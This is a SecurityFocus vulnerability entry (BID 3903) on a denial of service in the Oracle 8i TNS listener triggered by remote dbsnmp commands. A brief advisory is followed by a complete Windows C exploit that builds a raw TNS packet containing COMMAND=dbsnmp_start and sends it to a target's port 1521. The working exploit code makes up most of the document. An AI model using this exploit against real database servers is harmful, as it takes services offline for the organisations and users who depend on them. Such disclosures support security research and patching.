source: http://www.securityfocus.com/bid/3903/info

Oracle 8i is an enterprise level database solution. It is available on a wide variety of platforms, including many Unix operating systems.

It is possible to cause a denial of service condition in Oracle 8i. If either of the dbsnmp_start or dbsnmp_stop commands are sent remotely to the TNS listener service, a memory error will occur. The Oracle documentation states that these commands should only be used locally.

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#pragma comment (lib,"Ws2_32")
#define PORT 1521

#define buffsize2 buffsize+180
int main(int argc, char *argv[])
{


		char cmd1[]="(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=dbsnmp_start)";
		char cmd2[]="(VERSION=1)))";
		char head[]="\x00\x59\x00\x00\x01\x00\x00\x00\x01\x36"
			"\x01\x2c\x00\x00\x08\x00\x7f\xff\x7f\x08\x00\x00\x00\x01"
			"\x00\x1f\x00\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x34\xe6\x00\x00\x00\x01\x00\x00"
			"\x00\x00\x00\x00\x00\x00";

		char buffer2[200];
		int ret;
	int packetlength;
	int cmdlength;
	int tt;

	WSADATA WSAData;
	struct hostent          *ht;
	struct sockaddr_in      server;

	printf("Oracle dbsnmp command Remote Vulnerability discoveried by Benjurry\n");
	printf("Code by benjurry,benjurry@263.net\n");
	printf("www.xfocus.org  www.benjurry.org\n");
	if(argc<2)
	{
		printf("useage:%s target\n",argv[0]);
exit(1);
	}
	 tt=sizeof(head);

	packetlength=58+sizeof(cmd1)+sizeof(cmd2)-2;


	cmdlength=sizeof(cmd1)+sizeof(cmd2)-2;

	memcpy(buffer2,head,sizeof(head)-1);
	memcpy(buffer2+sizeof(head)-1,cmd1,sizeof(cmd1)-1);
	memcpy(buffer2+sizeof(head)-1+sizeof(cmd1)-1,cmd2,sizeof(cmd2));

	
  
	buffer2[0]=packetlength>> 8;
	buffer2[1]=packetlength & 0xff;
	buffer2[24]=cmdlength>>8;
	buffer2[25]=cmdlength& 0xff;


	


if((tt=WSAStartup(MAKEWORD(1,1), &WSAData)) != 0)
        {
                printf("WSAStartup failed.\n");
				tt=GetLastError();
                WSACleanup();
                exit(1);
        }
if((ht = gethostbyname(argv[1]))==0)
{
                printf("Unable to resolve host %s\n",argv[1]);
                exit(1);
        } 
server.sin_port = htons(PORT);
server.sin_family=AF_INET;
server.sin_addr=*((struct in_addr *)ht->h_addr);
   if((ret = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
                printf("Unable to set up socket\n");
                exit(1);
        }   

if((connect(ret, (struct sockaddr *) &server, sizeof(server))) == -1)
        {
                printf("Unable to connect\n");
                exit(1);
        }
        else
                printf("Connected.\n");
		//if(send(ret, tnsping, 100, 0) == -1)

		if(send(ret, buffer2, packetlength, 0) == -1)
        {
                printf("Unable to send\n");
                exit(1);
        }
        else
        {
                printf("code sented...\n");
                
        }
Sleep(1000);
closesocket(ret);
return 0;


}